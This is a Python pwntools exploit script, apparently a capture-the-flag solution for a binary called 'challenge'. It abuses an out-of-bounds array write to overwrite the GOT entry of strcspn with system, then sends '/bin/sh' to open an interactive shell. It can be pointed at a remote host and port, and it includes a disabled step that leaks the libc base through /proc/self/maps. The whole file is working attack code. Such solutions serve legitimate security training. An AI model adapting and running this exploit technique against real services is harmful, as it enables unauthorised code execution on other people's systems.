#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *take_notes
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def leak_libc():

    io.sendlineafter(b">", b"12")
    io.sendline(b"/proc/self/maps\x00")
    io.recvlines(5)
    libc.address = int((io.recvline().split(b"-")[0]), 16)
    info("libc base: %#x", libc.address)


def overwrite():
    offset = (exe.got["strcspn"] - exe.sym["pretty_large_array"]) // 8
    system = exe.plt["system"]
    
    io.sendlineafter(b">", b"14")
    io.sendline(str(offset).encode())
    io.sendline(str(system).encode())
    io.sendline(b"/bin/sh\x00")


def solve():

    # leak_libc()
    overwrite()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
